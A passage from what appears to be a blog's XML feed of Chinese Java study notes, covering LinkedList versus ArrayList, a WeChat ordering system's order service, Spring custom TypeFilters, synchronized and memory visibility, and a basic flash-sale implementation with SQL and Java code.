2、和ArrayList一样，LinkedList也是是未同步的，多线程并发读写时需要外部同步，如果不外部同步，那么可以使用Collections.synchronizedList方法对LinkedList的实例进行一次封装。 3、和ArrayList一样，LinkedList也对存储的元素无限制，允许null元素。 4、和ArrayList一样，LinkedList的迭代器也是快速失败的，并且也不是100%保证，不应去依赖这个性质。 5、顺序插入速度ArrayList会比较快，因为ArrayList是基于数组实现的，数组是事先new好的，只要往指定位置塞一个数据就好了；LinkedList则不同，每次顺序插入的时候LinkedList将new一个对象出来，如果对象比较大，那么new的时间势必会长一点，再加上一些引用赋值的操作，所以顺序插入LinkedList必然慢于ArrayList 6、基于上一点，因为LinkedList里面不仅维护了待插入的元素，还维护了Entry的前置Entry和后继Entry，如果一个LinkedList中的Entry非常多，那么LinkedList将比ArrayList更耗费一些内存 7、数据遍历的速度，看最后一部分，这里就不细讲了，结论是：使用各自遍历效率最高的方式，ArrayList的遍历效率会比LinkedList的遍历效率高一些 8、有些说法认为LinkedList做插入和删除更快，这种说法其实是不准确的： - `LinkedList`做插入、删除的时候，慢在寻址，快在只需要改变前后Entry的引用地址 - `ArrayList`做插入、删除的时候，慢在数组元素的批量`copy`，快在寻址 所以，如果待插入、删除的元素是在数据结构的前半段尤其是非常靠前的位置的时候，LinkedList的效率将大大快过ArrayList，因为ArrayList将批量copy大量的元素；越往后，对于LinkedList来说，因为它是双向链表，所以在第2个元素后面插入一个数据和在倒数第2个元素后面插入一个元素在效率上基本没有差别，但是ArrayList由于要批量copy的元素越来越少，操作速度必然追上乃至超过LinkedList。 从这个分析看出，如果你十分确定你插入、删除的元素是在前半段，那么就使用LinkedList；如果你十分确定你删除、删除的元素在比较靠后的位置，那么可以考虑使用ArrayList。如果你不能确定你要做的插入、删除是在哪儿呢？那还是建议你使用LinkedList吧，因为一来LinkedList整体插入、删除的执行效率比较稳定，没有ArrayList这种越往后越快的情况；二来插入元素的时候，弄得不好ArrayList就要进行一次扩容，记住，ArrayList底层数组扩容是一个既消耗时间又消耗空间的操作. 9、ArrayList使用最普通的for循环遍历，LinkedList使用foreach循环比较快.注意到ArrayList是实现了RandomAccess接口而LinkedList则没有实现这个接口.关于RandomAccess这个接口的作用，看一下JDK API上的说法： 10、如果使用普通for循环遍历LinkedList，在大数据量的情况下，其遍历速度将慢得令人发指 11、注意到jdk1.7以后版本与jdk1.6的版本双向链表底层是不一样的，jdk1.6使用的是一个带有头结点的双向循环链表，头结点不存储实际数据，循环链表指的是能够只通过一个方向的指针重新遍历到自己这个节点的链表，示意图如下。 七、参考 1、http://www.cnblogs.com/xrq730/p/5005347.html 2、http://blog.csdn.net/u013124587/article/details/52837848 3、http://blog.csdn.net/u011392897/article/details/57115818 4、http://blog.csdn.net/fighterandknight/article/details/61476335]]></content>
      <tags>
        <tag>java容器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[3.订单]]></title>
    <url>%2F2018%2F07%2F21%2F3.%E8%AE%A2%E5%8D%95%2F</url>
    <content type="text"><![CDATA[慕课网微信点餐系统学习 1、订单的两个实体类 订单的主表，是对应到用户的订单信息 1234567891011121314151617181920212223242526272829303132333435@Entity@Data@DynamicUpdatepublic class OrderMaster &#123; /** 订单id. */ @Id private String orderId; /** 买家名字. */ private String buyerName; /** 买家手机号. */ private String buyerPhone; /** 买家地址. */ private String buyerAddress; /** 买家微信Openid. */ private String buyerOpenid; /** 订单总金额. */ private BigDecimal orderAmount; /** 订单状态, 默认为0新下单. */ private Integer orderStatus = OrderStatusEnum.NEW.getCode(); /** 支付状态, 默认为0未支付. */ private Integer payStatus = PayStatusEnum.WAIT.getCode(); /** 创建时间. */ private Date createTime; /** 更新时间. */ private Date updateTime;&#125; 订单的详细表，是对应到每个订单中的详细信息 123456789101112131415161718192021222324@Entity@Datapublic class OrderDetail &#123; @Id private String detailId; /** 订单id. */ private String orderId; /** 商品id. */ private String productId; /** 商品名称. */ private String productName; /** 商品单价. */ private BigDecimal productPrice; /** 商品数量. */ private Integer productQuantity; /** 商品小图. */ private String productIcon;&#125; 2、对这两个实体创建dao层进行测试。 123public interface OrderMasterDao extends JpaRepository&lt;OrderMaster,String&gt;&#123; Page&lt;OrderMaster&gt; findByBuyerOpenid(String openid, Pageable pageable);&#125; 123public interface OrderDetailDao extends JpaRepository&lt;OrderDetail,String&gt;&#123; List&lt;OrderDetail&gt; findByOrderId(String orderid);&#125; 对于测试都省略了，后面开始着重重视设计，至于dao层的测试与前面讲的商品一样。 3、service层开发： 接口： 12345678910111213141516171819202122public interface OrderService&#123; /**创建订单*/ OrderDto create(OrderDto orderDto); /**根据order_id查询单个订单*/ OrderDto findOne(String orderid); /**查询某个用户的订单列表*/ Page&lt;OrderDto&gt; findListByOpenid(String openid, Pageable pageable); /**取消订单*/ OrderDto cancel(OrderDto orderDto); /**完结订单*/ OrderDto finish(OrderDto orderDto); /**支付订单*/ OrderDto paid(OrderDto orderDto); /**查询所有的订单列表*/ Page&lt;OrderDto&gt; findList(Pageable pageable);&#125; 3.1 创建订单： 1234567891011121314151617181920212223242526272829303132333435363738394041@Override@Transactionalpublic OrderDto create(OrderDto orderDto) &#123; String orderid = KeyUtil.genUniqueKey(); BigDecimal orderAmount = new BigDecimal(BigInteger.ZERO); //1、根据前端传来的商品id查询商品的单价、库存等信息 List&lt;OrderDetail&gt; orderDetailList = orderDto.getOrderDetailList(); for(OrderDetail orderDetail:orderDetailList)&#123; ProductInfo productInfo = productService.findProductById(orderDetail.getProductId()); if(productInfo == null)&#123; throw new SellException(ResultEnum.PRODUCT_NOT_EXIST); &#125; //2、拿到了对应的商品，我们就可以根据商品的单价和购买的数量算的总价了 orderAmount = productInfo.getProductPrice() .multiply(new BigDecimal(orderDetail.getProductQuantity())) .add(orderAmount); //3、订单详情入库 orderDetail.setDetailId(KeyUtil.genUniqueKey()); orderDetail.setOrderId(orderid); BeanUtils.copyProperties(productInfo,orderDetail); orderDetailDao.save(orderDetail); &#125; //4、订单主表入库 OrderMaster orderMaster = new OrderMaster(); orderDto.setOrderId(orderid); BeanUtils.copyProperties(orderDto,orderMaster); orderMaster.setOrderAmount(orderAmount); orderMaster.setOrderStatus(OrderStatusEnum.NEW.getCode()); orderMaster.setPayStatus(PayStatusEnum.WAIT.getCode()); orderMasterDao.save(orderMaster); //5、扣库存 List&lt;CartDTO&gt; cartDTOList = orderDto.getOrderDetailList().stream() .map(e -&gt; new CartDTO(e.getProductId(),e.getProductQuantity())) .collect(Collectors.toList()); productService.decreaseStock(cartDTOList); return orderDto;&#125; 扣库存这一块： 1234567891011121314151617181920@Override@Transactionalpublic void decreaseStock(List&lt;CartDTO&gt; cartDTOList) &#123; //1、首先是遍历他，获得产品的id和对应的购买数量 for(CartDTO cartDTO:cartDTOList)&#123; ProductInfo productInfo = productInfoDao.findOne(cartDTO.getProductId()); if (productInfo == null) &#123; throw new SellException(ResultEnum.PRODUCT_NOT_EXIST); &#125; //2、查出相应产品在数据库中的库存，进行比较 Integer result = productInfo.getProductStock()-cartDTO.getProductQuantity(); if(result&lt;0)&#123; throw new SellException(ResultEnum.PRODUCT_STOCK_ERROR); &#125; //3、如果库存还有，就减库存 productInfo.setProductStock(result); //4、存库 productInfoDao.save(productInfo); &#125;&#125; controller这一层： 123456789101112131415161718192021222324252627282930@RestController@RequestMapping("/buyer/order")@Slf4jpublic class BuyerOrderController &#123; @Autowired private OrderService orderService; @RequestMapping("/create") public ResultVO&lt;Map&lt;String,String&gt;&gt; create(@Valid OrderForm orderForm, BindingResult br)&#123; //先进行数据的验证 if(br.hasErrors())&#123; log.error("【创建订单】参数不正确, orderForm=&#123;&#125;", orderForm); throw new SellException(ResultEnum.PARAM_ERROR); &#125; //这里还要判断一下购物车是不是为空，就是items中有没有值 //这里的items是一个list，如果死List，就好处理了。。。 //并且创建订单所传入的对象是OrderDto,所以必须要转一下 OrderDto orderDto = OrderForm2OrderDTOConverter.convert(orderForm); if(StringUtils.isEmpty(orderDto.getOrderDetailList()))&#123; log.error("【创建订单】购物车不能为空"); throw new SellException(ResultEnum.CART_EMPTY); &#125; //创建订单 OrderDto create = orderService.create(orderDto); //返回orderId给前端 Map&lt;String,String&gt; map = new HashMap&lt;&gt;(); map.put("orderId",create.getOrderId()); return ResultVOUtil.success(map); &#125;&#125; 对于转换的程序： 123456789101112131415161718192021222324@Slf4jpublic class OrderForm2OrderDTOConverter &#123; public static OrderDto convert(OrderForm orderForm) &#123; Gson gson = new Gson(); OrderDto orderDto = new OrderDto(); orderDto.setBuyerName(orderForm.getName()); orderDto.setBuyerPhone(orderForm.getPhone()); orderDto.setBuyerAddress(orderForm.getAddress()); orderDto.setBuyerOpenid(orderForm.getOpenid()); List&lt;OrderDetail&gt; orderDetailList = new ArrayList&lt;&gt;(); try &#123; orderDetailList = gson.fromJson(orderForm.getItems(), new TypeToken&lt;List&lt;OrderDetail&gt;&gt;() &#123; &#125;.getType()); &#125; catch (Exception e) &#123; log.error("【对象转换】错误, string=&#123;&#125;", orderForm.getItems()); throw new SellException(ResultEnum.PARAM_ERROR); &#125; orderDto.setOrderDetailList(orderDetailList); return orderDto; &#125;&#125; 主要是利用Gson将items这个类似于map的数据转为list。 postman进行测试： 12345678localhost:8080/sell/buyer/order/create//以表单的形式提交，即x-www-form-urlencoded,点击右边的key-value-edit，将下面的复制进去：name:张三phone:18868822111address:慕课网总部openid:ew3euwhd7sjw9diwkqitems:[&#123;productId:124,productQuantity: 1&#125;] 返回： 1234567&#123; "code": 0, "msg": "成功", "data": &#123; "orderId": "1512719606250354875" &#125;&#125; 3.2 查询某个订单 123456789101112131415@Overridepublic OrderDto findOne(String orderid) &#123; OrderDto orderDto = new OrderDto(); OrderMaster orderMaster = orderMasterDao.findOne(orderid); if(orderMaster == null)&#123; throw new SellException(ResultEnum.ORDER_NOT_EXIST); &#125; List&lt;OrderDetail&gt; orderDetailList = orderDetailDao.findByOrderId(orderid); if(CollectionUtils.isEmpty(orderDetailList))&#123; throw new SellException(ResultEnum.ORDER_NOT_EXIST); &#125; BeanUtils.copyProperties(orderMaster,orderDto); orderDto.setOrderDetailList(orderDetailList); return orderDto;&#125; 3.3 订单列表 用户openid查询他的订单列表，不需要获取订单详情： 123456@Overridepublic Page&lt;OrderDto&gt; findListByOpenid(String openid, Pageable pageable) &#123; Page&lt;OrderMaster&gt; orderMasterPage = orderMasterDao.findByBuyerOpenid(openid,pageable); List&lt;OrderDto&gt; orderDtoList = OrderMaster2OrderDTOConverter.convert(orderMasterPage.getContent()); return new PageImpl&lt;OrderDto&gt;(orderDtoList,pageable,orderMasterPage.getTotalElements());&#125; controller： 123456789101112@RequestMapping("/list")public ResultVO&lt;List&lt;OrderDto&gt;&gt; list(@RequestParam("openid") String openid, @RequestParam(value = "page", defaultValue = "0") Integer page, @RequestParam(value = "size", defaultValue = "10") Integer size)&#123; if (StringUtils.isEmpty(openid))&#123; log.error("【查询订单列表】openid为空"); throw new SellException(ResultEnum.PARAM_ERROR); &#125; PageRequest pageRequest = new PageRequest(page,size); Page&lt;OrderDto&gt; orderDtoPage = orderService.findListByOpenid(openid,pageRequest); return ResultVOUtil.success(orderDtoPage.getContent());&#125; post请求： 123localhost:8080/sell/buyer/order/list加上paranm：openid，page,size 返回： 1234567891011121314151617181920212223242526272829303132&#123; "code": 0, "msg": "成功", "data": [ &#123; "orderId": "1512719526404570231", "buyerName": "张三", "buyerPhone": "18868822111", "buyerAddress": "慕课网总部", "buyerOpenid": "ew3euwhd7sjw9diwkq", "orderAmount": 246, "orderStatus": 0, "payStatus": 0, "createTime": 1512690726000, "updateTime": 1512690726000, "orderDetailList": null &#125;, &#123; "orderId": "1512719606250354875", "buyerName": "张三", "buyerPhone": "18868822111", "buyerAddress": "慕课网总部", "buyerOpenid": "ew3euwhd7sjw9diwkq", "orderAmount": 9.3, "orderStatus": 0, "payStatus": 0, "createTime": 1512690806000, "updateTime": 1512690806000, "orderDetailList": null &#125; ]&#125; 如果我们需要将null的不显示： 12jackson: default-property-inclusion: non_null 但是这个存在的问题是，如果我们想让空字符串以“”的形式展现：解决方法是在实体类中赋予初值。 3.4 取消订单 12345678910111213141516171819202122232425@Overridepublic OrderDto cancel(OrderDto orderDto) &#123; //1、判断订单的状态是不是新订单的状态，不是则抛出异常 if (!orderDto.getOrderStatus().equals(OrderStatusEnum.NEW.getCode())) &#123; log.error("【取消订单】订单状态不正确, orderId=&#123;&#125;, orderStatus=&#123;&#125;", orderDto.getOrderId(), orderDto.getOrderStatus()); throw new SellException(ResultEnum.ORDER_PAY_STATUS_ERROR); &#125; //2、修改订单状态 OrderMaster orderMaster = new OrderMaster(); orderDto.setOrderStatus(OrderStatusEnum.CANCEL.getCode()); BeanUtils.copyProperties(orderDto,orderMaster); orderMasterDao.save(orderMaster); //3、返还库存 if (CollectionUtils.isEmpty(orderDto.getOrderDetailList())) &#123; log.error("【取消订单】订单中无商品详情, orderDTO=&#123;&#125;", orderDto); throw new SellException(ResultEnum.ORDER_DETAIL_EMPTY); &#125; List&lt;CartDTO&gt; cartDTOList = orderDto.getOrderDetailList().stream() .map(e -&gt; new CartDTO(e.getProductId(),e.getProductQuantity())) .collect(Collectors.toList()); productService.increaseStock(cartDTOList); //4、TODO 如果已支付, 需要退款 return orderDto;&#125; 3.5 支付订单 123456789101112131415161718192021@Overridepublic OrderDto paid(OrderDto orderDto) &#123; if(!orderDto.getOrderStatus().equals(OrderStatusEnum.NEW.getCode()))&#123; log.error("【订单支付完成】订单状态不正确, orderId=&#123;&#125;, orderStatus=&#123;&#125;", orderDto.getOrderId(), orderDto.getOrderStatus()); throw new SellException(ResultEnum.ORDER_STATUS_ERROR); &#125; if(!orderDto.getPayStatus().equals(PayStatusEnum.WAIT))&#123; log.error("【订单支付完成】订单支付状态不正确, orderDTO=&#123;&#125;", orderDto); throw new SellException(ResultEnum.ORDER_PAY_STATUS_ERROR); &#125; OrderMaster orderMaster = new OrderMaster(); orderDto.setPayStatus(PayStatusEnum.SUCCESS.getCode()); BeanUtils.copyProperties(orderDto,orderMaster); OrderMaster updateResult = orderMasterDao.save(orderMaster); if (updateResult == null) &#123; log.error("【订单支付完成】更新失败, orderMaster=&#123;&#125;", orderMaster); throw new SellException(ResultEnum.ORDER_UPDATE_FAIL); &#125; return orderDto;&#125; 3.6 完结订单 123456789101112131415161718@Overridepublic OrderDto finish(OrderDto orderDto) &#123; if(!orderDto.getOrderStatus().equals(OrderStatusEnum.NEW.getCode()))&#123; log.error("【取消订单】订单状态不正确, orderId=&#123;&#125;, orderStatus=&#123;&#125;", orderDto.getOrderId(), orderDto.getOrderStatus()); throw new SellException(ResultEnum.ORDER_PAY_STATUS_ERROR); &#125; OrderMaster orderMaster = new OrderMaster(); orderDto.setOrderStatus(OrderStatusEnum.FINISHED.getCode()); BeanUtils.copyProperties(orderDto,orderMaster); OrderMaster updateResult = orderMasterDao.save(orderMaster); if (updateResult == null) &#123; log.error("【完结订单】更新失败, orderMaster=&#123;&#125;", orderMaster); throw new SellException(ResultEnum.ORDER_UPDATE_FAIL); &#125; return orderDto; //TODO 发送模板消息&#125; 4、controller层： 123456789101112131415//订单详情@GetMapping("/detail")public ResultVO detail(@RequestParam("openid") String openid, @RequestParam("orderid") String orderid) &#123; OrderDto orderDTO = buyerService.findOrderOne(openid, orderid); return ResultVOUtil.success(orderDTO);&#125;//取消订单@PostMapping("/cancel")public ResultVO cancel(@RequestParam("openid") String openid, @RequestParam("orderid") String orderid) &#123; buyerService.cancelOrder(openid, orderid); return ResultVOUtil.success();&#125; 这里将订单详情和取消订单集成到BuyerServiceImpl中： 12345678910111213141516171819202122232425262728293031323334@Service@Slf4jpublic class BuyerServiceImpl implements BuyerService&#123; @Autowired private OrderService orderService; @Override public OrderDto findOrderOne(String openid, String orderId) &#123; return checkOrderOwner(openid,orderId); &#125; @Override public OrderDto cancelOrder(String openid, String orderId) &#123; OrderDto orderDto = checkOrderOwner(openid,orderId); if(orderDto==null)&#123; log.error("【取消订单】查不到改订单, orderId=&#123;&#125;", orderId); throw new SellException(ResultEnum.ORDER_NOT_EXIST); &#125; return orderService.cancel(orderDto); &#125; private OrderDto checkOrderOwner(String openid, String orderId)&#123; OrderDto orderDto = orderService.findOne(orderId); if (orderDto == null) &#123; return null; &#125; if(!orderDto.getBuyerOpenid().equalsIgnoreCase(openid))&#123; log.error("【查询订单】订单的openid不一致. openid=&#123;&#125;, orderDTO=&#123;&#125;", openid, orderDto); throw new SellException(ResultEnum.ORDER_OWNER_ERROR); &#125; return orderDto; &#125;&#125;]]></content>
      <tags>
        <tag>微信点餐系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[3.自定义TypeFilter制定过滤规则]]></title>
    <url>%2F2018%2F07%2F21%2F3.%E8%87%AA%E5%AE%9A%E4%B9%89TypeFilter%E6%8C%87%E5%AE%9A%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99%2F</url>
    <content type="text"><![CDATA[学习spring注解版来实现组件的注册。 上面包扫描是按照FilterType.ANNOTATION规则来实现的，他还有其他几种规则： 12345678910public enum FilterType &#123; ANNOTATION,//注解，最常用 ASSIGNABLE_TYPE,//按照给定的类型，比如指定是BookService.class，那么只要是BookService这个类型就会被规则配置进来，子类或者实现类都可以 ASPECTJ,//ASPECTJ表达式，不常用 REGEX,//正则 CUSTOM;//自定义规则 private FilterType() &#123; &#125;&#125; 对于最后的CUSTOM，这里着重说一说怎么用。 首先是要求实现FilterType接口： 1234567891011121314151617181920212223public class MyTypeFilter implements TypeFilter&#123; /** * * @param metadataReader:读取到的当前正在扫描的类的信息 * @param metadataReaderFactory：可以获取到其他任何类信息 * @return * @throws IOException */ @Override public boolean match(MetadataReader metadataReader, MetadataReaderFactory metadataReaderFactory) throws IOException &#123; //获取当前类注解信息 AnnotationMetadata annotationMetadata = metadataReader.getAnnotationMetadata(); //获取当前正在扫描的类的类信息,可以获取子类，父类，接口等信息 ClassMetadata classMetadata = metadataReader.getClassMetadata(); //获取当前类资源（类的路径） Resource resource = metadataReader.getResource(); String className = classMetadata.getClassName(); System.out.println("----&gt;"+className); return false; &#125;&#125; 返回false，表示不匹配，返回true的就匹配。这里默认是false； 在mainConfig类中配置这个自定义的过滤规则： 123@ComponentScan(value = "com.swg", includeFilters = &#123;@ComponentScan.Filter(type = FilterType.CUSTOM,classes = &#123;MyTypeFilter.class&#125;)&#125;,useDefaultFilters = false) 那么此时输出： 1234567891011121314151617----&gt;com.swg.AppTest----&gt;com.swg.bean.Person----&gt;com.swg.controller.BookController----&gt;com.swg.dao.BookDao----&gt;com.swg.FilterType.MyTypeFilter----&gt;com.swg.MainTest----&gt;com.swg.service.BookServiceorg.springframework.context.annotation.internalConfigurationAnnotationProcessororg.springframework.context.annotation.internalAutowiredAnnotationProcessororg.springframework.context.annotation.internalRequiredAnnotationProcessororg.springframework.context.annotation.internalCommonAnnotationProcessororg.springframework.context.event.internalEventListenerProcessororg.springframework.context.event.internalEventListenerFactorymainConfigperson 就是显示了所有他处理的类，最后由于都返回fasle，那么那些controller，service都将被过滤掉。 下面指定通过一个： 123if(className.contains("er"))&#123; return true;&#125; 输出： 123456mainConfigpersonbookController//newmyTypeFilter//newbookService//new]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[3.线程安全性-synchronized]]></title>
    <url>%2F2018%2F07%2F21%2F3.%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E6%80%A7-synchronized%2F</url>
    <content type="text"><![CDATA[再来简单回顾一下synchronized关键字。 1. synchronized介绍 修饰代码块：大括号括起来的代码，作用于调用的对象 12345678910111213141516171819202122232425//输出结果是：两个分别都是0-9，顺序执行public class SyncTest1 &#123; public void add1(int j)&#123; synchronized (this)&#123; for(int i=0;i&lt;10;i++)&#123; System.out.println(j+"---"+i); &#125; &#125; &#125; public static void main(String[] args) &#123; SyncTest1 test1 = new SyncTest1(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; &#123; test1.add2(1); &#125;); executorService.execute(() -&gt; &#123; test1.add2(2); &#125;); &#125;&#125; 修饰方法：整个方法，作用于调用的对象 1234567891011121314151617181920//输出结果是：两个分别都是0-9，顺序执行public class SyncTest1 &#123; public synchronized void add2(int j)&#123; for(int i=0;i&lt;10;i++)&#123; System.out.println(j+"---"+i); &#125; &#125; public static void main(String[] args) &#123; SyncTest1 test1 = new SyncTest1(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; &#123; test1.add2(1); &#125;); executorService.execute(() -&gt; &#123; test1.add2(2); &#125;); &#125;&#125; 修饰静态方法：整个静态方法，作用于所有对象 1234567891011121314151617181920212223242526272829//输出结果是：两个分别都是0-9，顺序执行public class SyncTest2 &#123; public static void add1(int j)&#123; synchronized (SyncTest2.class)&#123; for(int i=0;i&lt;10;i++)&#123; System.out.println(j+"---"+i); &#125; &#125; &#125; public synchronized static void add2(int j)&#123; for(int i=0;i&lt;10;i++)&#123; System.out.println(j+"---"+i); &#125; &#125; public static void main(String[] args) &#123; SyncTest2 test1 = new SyncTest2(); SyncTest2 test2 = new SyncTest2(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; &#123; test1.add1(1); &#125;); executorService.execute(() -&gt; &#123; test2.add2(2); &#125;); &#125;&#125; 修饰类：括号括起来的部分，作用于所有对象 关于synchronized的用法，另外已经详细学习过了，这里不再赘述。 2. 原子性方案对比 synchronized：不可中断锁，适合竞争不激烈，可读性好 lock：可中断锁，多样化同步，竞争激烈时能维持常态 Atomic：竞争激烈时能维持常态，比Lock性能好，但是只能同步一个值 3. 可见性导致共享变量在线程间不可见的原因 线程交叉执行 重排序结合线程交叉执行 共享变量更新后的值没有在工作内存与主内存之间及时更新 JMM关于synchronized的两条规定 线程解锁前，必须将共享变量的最新值刷新到主内存 线程加锁时，将清空工作内存中共享变量的值，从而使用共享变量时需要从主内存中重新读取最新的值（注意，加锁和解锁是同一把锁） 可见性-volatile 通过加入内存屏障和禁止指令重排序优化来实现。 对volatile变量写操作时，会在写操作后加入一条store屏障指令，将本地内存中的共享变量值刷新到主内存 对volatile变量读操作时，会在读操作前加入一条load屏障指令，从主内存中读取共享变量 volatile不能保证线程安全适合作为状态标识。 关于volatile已经详细学习了，不再赘述。 4. 有序性java内存模型对执行进行重排序，不会影响单线程执行，但是会影响多线程并发执行的正确性。 happens-before原则 程序次序规则：一个线程内，按照代码书写顺序，书写在前面的操作先行发生于书写在后面的操作。（看起来是按照代码顺序执行，虽然JVM会指令进行重排序，但是执行结果是一样的） 锁定规则：一个unlock操作先行发生于Lock操作（同一个锁，如果锁处于lock状态，只有释放锁，才能再进行lock） volatile变量规则：对一个变量的写操作先行发生于后面对这个变量的读操作。 传递规则 线程启动规则：start方法最先发生 线程中断规则：intterrupt()执行之后才能监测到中断事件的发生 线程终结规则：线程终止是最后发生 对象终结规则：一个对象的初始化完成先行发生于他的finalize()方法的开始。]]></content>
      <tags>
        <tag>java并发进阶</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[3.秒杀功能实现]]></title>
    <url>%2F2018%2F07%2F21%2F3.%E7%A7%92%E6%9D%80%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[先从业务上实现最基本的秒杀功能。 1. 表设计商品表：12345678910CREATE TABLE `goods`( `id` BIGINT(20) NOT NULL AUTO_INCREMENT COMMENT '商品ID', `goods_name` VARCHAR(16) DEFAULT NULL COMMENT '商品名称', `goods_title` VARCHAR(64) DEFAULT NULL COMMENT '商品标题', `goods_img` VARCHAR(64) DEFAULT NULL COMMENT '商品图片', `goods_detail` LONGTEXT COMMENT '商品的详情介绍', `goods_price` DECIMAL(10,2) DEFAULT '0.00' COMMENT '商品单价', `goods_stock` INT(11) DEFAULT '0' COMMENT '商品库存，-1表示没有限制', PRIMARY KEY (`id`)); 秒杀商品表：123456789CREATE TABLE `miaosha_goods`( `id` BIGINT(20) NOT NULL AUTO_INCREMENT COMMENT '秒杀商品ID', `goods_id` BIGINT(16) DEFAULT NULL COMMENT '商品id', `miaosha_price` DECIMAL(10,2) DEFAULT '0.00' COMMENT '秒杀价', `stock_count` INT(11) DEFAULT '0' COMMENT '库存数量', `start_date` datetime DEFAULT NULL COMMENT '秒杀开始时间', `end_date` datetime DEFAULT NULL COMMENT '秒杀结束时间', PRIMARY KEY (`id`)); 订单信息表：1234567891011121314CREATE TABLE `order_info`( `id` BIGINT(20) NOT NULL AUTO_INCREMENT COMMENT 'order ID', `user_id` BIGINT(20) DEFAULT NULL COMMENT '用户id', `goods_id` BIGINT(20) DEFAULT NULL COMMENT '商品id', `delivery_addr_id` BIGINT(20) DEFAULT NULL COMMENT '收货地址', `goods_name` VARCHAR(16) DEFAULT NULL COMMENT '商品名称', `goods_count` INT(11) DEFAULT '0' COMMENT '商品数量', `goods_price` DECIMAL(10,2) DEFAULT '0.00' COMMENT '商品单价', `order_channel` TINYINT(4) DEFAULT '0' COMMENT '1pc,2android,3ios', `status` TINYINT(4) DEFAULT '0' COMMENT '0新建未支付，2已支付，3已发货4，已收货，5已完成', `create_date` datetime DEFAULT NULL COMMENT '订单创建时间', `pay_date` datetime DEFAULT NULL COMMENT '支付时间', PRIMARY KEY (`id`)); 秒杀订单表：1234567CREATE TABLE `miaosha_order`( `id` BIGINT(20) NOT NULL AUTO_INCREMENT COMMENT '秒杀 order ID', `user_id` BIGINT(20) DEFAULT NULL COMMENT '用户id', `order_id` BIGINT(20) DEFAULT NULL COMMENT '订单id', `goods_id` BIGINT(20) DEFAULT NULL COMMENT '商品id', PRIMARY KEY (`id`)); 2. 商品列表页展示123456@Mapperpublic interface GoodsDao &#123; @Select("select g.*,mg.stock_count,mg.start_date,mg.end_date,mg.miaosha_price from miaosha_goods mg left join goods g on mg.goods_id = g.id") List&lt;GoodsVo&gt; getGoodsVoList();&#125; 注意要创建一个vo对象来承载goods和miaosha_goods两个对象。 另外注意，之前的yml中对于mybatis的配置，忘记了配置驼峰写法： 12configuration: map-underscore-to-camel-case: true jsp就不贴在这了。 3. 商品详情页面接收前端传来的goods_id，因为要处理显示秒杀活动还剩多少秒，所以进行了相应的判断，以及秒杀的状态。12345678910111213141516171819202122232425262728@RequestMapping("/to_detail/&#123;goodsId&#125;")public String toList(@PathVariable("goodsId") long goodsId,Model model, MiaoshaUser user)&#123; if(user == null) return "login"; model.addAttribute("user",user); GoodsVo goodsVo = goodsService.getGoodsVoByGoodsId(goodsId); model.addAttribute("goods",goodsVo); long startAt = goodsVo.getStartDate().getTime(); long endAt = goodsVo.getEndDate().getTime(); long now = System.currentTimeMillis(); int miaoshaStatus = 0;//秒杀活动的状态，0-秒杀前；1-正在秒杀；2-秒杀结束 int remainSeconds = 0;//秒杀活动还剩多少秒 if(now &lt; startAt)&#123; miaoshaStatus = Constants.MiaoshaStatus.BEFORE_START; remainSeconds = (int)(startAt-now)/1000; &#125;else if (now &gt; endAt)&#123; miaoshaStatus = Constants.MiaoshaStatus.AFTER_MIAOSHA; remainSeconds = -1; &#125;else &#123; miaoshaStatus = Constants.MiaoshaStatus.ON_MIAOSHA; remainSeconds = 0; &#125; model.addAttribute("miaoshaStatus",miaoshaStatus); model.addAttribute("remainSeconds",remainSeconds); return "goods_detail";&#125; 对于前端，只需要拿到这个remainSeconds就可以了，可以对应显示秒杀还剩多久、秒杀是否结束等。 123456789101112131415161718192021function countDown()&#123; var remainSeconds = $("#remainSeconds").val(); var timeout; if(remainSeconds &gt; 0)&#123;//秒杀还没开始，倒计时 $("#buyButton").attr("disabled", true); timeout = setTimeout(function()&#123; $("#countDown").text(remainSeconds - 1); $("#remainSeconds").val(remainSeconds - 1); countDown(); &#125;,1000); &#125;else if(remainSeconds == 0)&#123;//秒杀进行中 $("#buyButton").attr("disabled", false); if(timeout)&#123; clearTimeout(timeout); &#125; $("#miaoshaTip").html("秒杀进行中"); &#125;else&#123;//秒杀已经结束 $("#buyButton").attr("disabled", true); $("#miaoshaTip").html("秒杀已经结束"); &#125;&#125; 4. 秒杀功能实现判断库存 | 根据userId和goodsId判断是否已经抢过了 | 减库存，下订单，并且写入秒杀订单(同一事务中完成) 判断库存： 123456//判断库存GoodsVo goodsVo = goodsService.getGoodsVoByGoodsId(goodsId);if(goodsVo.getStockCount() &lt;= 0)&#123; model.addAttribute("errmsg", CodeMsg.MIAO_SHA_OVER.getMsg()); return "miaosha_fail";&#125; 判断是否已经抢过了： 123456//判断是否已经秒杀到了MiaoshaOrder miaoshaOrder = orderService.getMiaoshaOrderByUserIdGoodsId(user.getId(),goodsId);if(miaoshaOrder != null)&#123; model.addAttribute("errmsg", CodeMsg.REPEATE_MIAOSHA.getMsg()); return "miaosha_fail";&#125; 减库存，下订单，并且写入秒杀订单(同一事务中完成)： 12//减库存、下订单、写入秒杀订单,需要在一个事务中执行OrderInfo orderInfo = miaoshaService.miaosha(user,goodsVo); 在MiaoshaService中写： 12345678910@Transactionalpublic OrderInfo miaosha(MiaoshaUser user, GoodsVo goods) &#123; //减库存、下订单、写入秒杀订单 boolean success =goodsService.reduceStock(goods); if(success)&#123; return orderService.createOrder(user,goods); &#125;else&#123; return null; &#125;&#125; 对于减库存： 这里只需要减miaosha_goods表里的库存即可。因为秒杀的数据是先从goods表里得到的，所以goods表里的库存此段已经减掉了。12@Update("update miaosha_goods set stock_count = stock_count-1 where goods_id=#&#123;goodsId&#125;")int reduceStock(MiaoshaGoods g); 123456public boolean reduceStock(GoodsVo goods) &#123; MiaoshaGoods g = new MiaoshaGoods(); g.setGoodsId(goods.getId()); int ret = goodsDao.reduceStock(g); return ret &gt; 0;&#125; 